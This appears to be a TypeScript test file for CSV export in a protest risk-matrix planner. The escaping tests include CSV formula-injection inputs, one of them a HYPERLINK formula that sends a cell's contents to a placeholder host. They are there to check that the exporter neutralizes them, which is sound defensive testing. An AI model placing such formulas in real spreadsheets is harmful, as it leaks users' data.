import { describe, expect, it } from "vitest";
import {
  buildMatrixCsv,
  buildWorksheetCsv,
  escapeCsvField,
  MATRIX_CSV_HEADERS,
} from "./matrixCsv";
import { emptyGrid } from "./riskMatrixUtils";

/** Minimal RFC 4180 reader, enough to check what a spreadsheet would see. */
function parseCsv(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i];
    if (quoted) {
      if (c === '"' && csv[i + 1] === '"') {
        field += '"';
        i++;
      } else if (c === '"') {
        quoted = false;
      } else {
        field += c;
      }
    } else if (c === '"') {
      quoted = true;
    } else if (c === ",") {
      row.push(field);
      field = "";
    } else if (c === "\r" && csv[i + 1] === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      i++;
    } else {
      field += c;
    }
  }
  return rows;
}

function sampleGrid() {
  const grid = emptyGrid();
  // Medium likelihood, high impact: orange.
  grid["1-2"] = [
    {
      id: "a",
      text: "Phone seized at protest",
      reduce: [
        { id: "a1", text: "Leave phone at home", starred: true },
        { id: "a2", text: "", starred: false },
      ],
      prepare: [{ id: "a3", text: "Full-disk encryption", starred: false }],
    },
  ];
  // High likelihood, high impact: red. Listed first despite being added second.
  grid["0-2"] = [{ id: "b", text: "Doxxing", reduce: [], prepare: [] }];
  grid["2-0"] = [{ id: "c", text: "   ", reduce: [], prepare: [] }];
  return grid;
}

describe("buildMatrixCsv", () => {
  it("writes one row per mitigation, highest risk first, then pool and other actions", () => {
    const csv = buildMatrixCsv({
      pool: [
        { id: "p1", text: "Infiltrator" },
        { id: "p2", text: "" },
      ],
      grid: sampleGrid(),
      otherActions: [
        { id: "o1", text: "Set up a phone tree" },
        { id: "o2", text: " " },
      ],
    });
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(parseCsv(csv.slice(1))).toEqual([
      [...MATRIX_CSV_HEADERS],
      ["Highest risk", "High", "High", "Doxxing", "", "", ""],
      [
        "High risk",
        "Medium",
        "High",
        "Phone seized at protest",
        "Reduction",
        "Leave phone at home",
        "Yes",
      ],
      [
        "High risk",
        "Medium",
        "High",
        "Phone seized at protest",
        "Preparation",
        "Full-disk encryption",
        "",
      ],
      ["Not yet placed", "", "", "Infiltrator", "", "", ""],
      ["", "", "", "", "Other action", "Set up a phone tree", "Yes"],
    ]);
  });

  it("writes only the header for an empty matrix", () => {
    const csv = buildMatrixCsv({ pool: [], grid: emptyGrid(), otherActions: [] });
    expect(parseCsv(csv.slice(1))).toEqual([[...MATRIX_CSV_HEADERS]]);
  });

  it("keeps commas, quotes and newlines inside one cell", () => {
    const grid = emptyGrid();
    grid["1-1"] = [
      { id: "x", text: 'Police "kettle", then\nmass arrest', reduce: [], prepare: [] },
    ];
    const rows = parseCsv(
      buildMatrixCsv({ pool: [], grid, otherActions: [] }).slice(1),
    );
    expect(rows[1][3]).toBe('Police "kettle", then\nmass arrest');
  });
});

describe("escapeCsvField", () => {
  it("neutralizes text a spreadsheet would run as a formula", () => {
    for (const evil of [
      '=HYPERLINK("https://example.invalid/?"&A1)',
      "+1+1",
      "-2+3",
      "@SUM(A1)",
      "\t=1",
      "\r=1",
    ]) {
      const escaped = escapeCsvField(evil);
      const cell = escaped.startsWith('"')
        ? escaped.slice(1, -1).replace(/""/g, '"')
        : escaped;
      expect(cell.startsWith("'")).toBe(true);
    }
  });

  it("leaves ordinary text alone", () => {
    expect(escapeCsvField("Doxxing")).toBe("Doxxing");
    expect(escapeCsvField("")).toBe("");
  });
});

describe("buildWorksheetCsv", () => {
  function worksheet(overrides: Partial<Parameters<typeof buildWorksheetCsv>[0]> = {}) {
    const rows = parseCsv(
      buildWorksheetCsv({
        title: "Spring march",
        pool: [{ id: "p1", text: "Infiltrator" }],
        grid: sampleGrid(),
        otherActions: [{ id: "o1", text: "Set up a phone tree" }],
        notes: "## Plan\n\n \n\n- Meet at the library\n- Bring water",
        ...overrides,
      }).slice(1),
    );
    // Drop the padding so assertions read like the sheet.
    return rows.map((r) => {
      const out = [...r];
      while (out.length > 0 && out[out.length - 1] === "") out.pop();
      return out;
    });
  }

  it("lays the page out top to bottom", () => {
    expect(worksheet()).toEqual([
      ["# Spring march"],
      [],
      ["━━ STEP 1 · RISK POOL (not yet on the matrix) ━━"],
      ["• Infiltrator"],
      [],
      ["━━ STEP 2 · RISK MATRIX ━━"],
      ["Likelihood ↓   Impact →", "Low impact", "Medium impact", "High impact"],
      ["High likelihood", "", "", "🔴 Doxxing"],
      ["Medium likelihood", "", "", "🟠 Phone seized at protest"],
      ["Low likelihood"],
      [],
      ["━━ STEP 3 · MITIGATIONS (⭐ = an action you intend to take) ━━"],
      [
        "Risk",
        "How can we reduce the likelihood of this happening?",
        "How can we limit the harm if it happens?",
      ],
      ["🔴 HIGHEST RISK"],
      ["🔴 Doxxing"],
      ["🟠 HIGH RISK"],
      ["🟠 Phone seized at protest", "⭐ Leave phone at home", "• Full-disk encryption"],
      [],
      ["━━ ⭐ ACTIONS ━━"],
      ["⭐ Leave phone at home", "Reduction for 🟠 Phone seized at protest"],
      ["Other actions"],
      ["• Set up a phone tree"],
      [],
      ["━━ NOTES ━━"],
      ["## Plan"],
      [],
      ["• Meet at the library"],
      ["• Bring water"],
    ]);
  });

  it("puts every risk in a cell on its own line, with the cell's color", () => {
    const grid = emptyGrid();
    grid["1-1"] = [
      { id: "a", text: "Kettling", reduce: [], prepare: [] },
      { id: "b", text: "Mass arrest", reduce: [], prepare: [] },
    ];
    const rows = worksheet({ grid });
    const medium = rows.find((r) => r[0] === "Medium likelihood");
    expect(medium?.[2]).toBe("🟡 Kettling\n🟡 Mass arrest");
  });

  it("gives a risk as many rows as its longest mitigation column", () => {
    const grid = emptyGrid();
    grid["0-0"] = [
      {
        id: "a",
        text: "Rain",
        reduce: [
          { id: "r1", text: "Check forecast", starred: false },
          { id: "r2", text: "Pick a covered spot", starred: false },
          { id: "r3", text: "Have a backup date", starred: false },
        ],
        prepare: [{ id: "p1", text: "Ponchos", starred: true }],
      },
    ];
    const rows = worksheet({ grid });
    const start = rows.findIndex((r) => r[0] === "🟡 Rain");
    expect(rows.slice(start, start + 3)).toEqual([
      ["🟡 Rain", "• Check forecast", "⭐ Ponchos"],
      ["", "• Pick a covered spot"],
      ["", "• Have a backup date"],
    ]);
  });

  it("says so when sections are empty, and leaves notes out when blank", () => {
    const rows = worksheet({ pool: [], grid: emptyGrid(), otherActions: [], notes: " " });
    expect(rows).toContainEqual(["(No risks left in the pool)"]);
    expect(rows).toContainEqual(["(No risks on the matrix yet)"]);
    expect(rows).toContainEqual(["(No actions yet. Star a mitigation to add it here.)"]);
    expect(rows.flat().join(" ")).not.toContain("NOTES");
  });

  it("still neutralizes formulas in text a spreadsheet would run", () => {
    const csv = buildWorksheetCsv({
      title: "T",
      pool: [],
      grid: emptyGrid(),
      otherActions: [],
      notes: "=HYPERLINK(\"https://example.invalid\")",
    });
    expect(csv).toContain("'=HYPERLINK");
  });
});
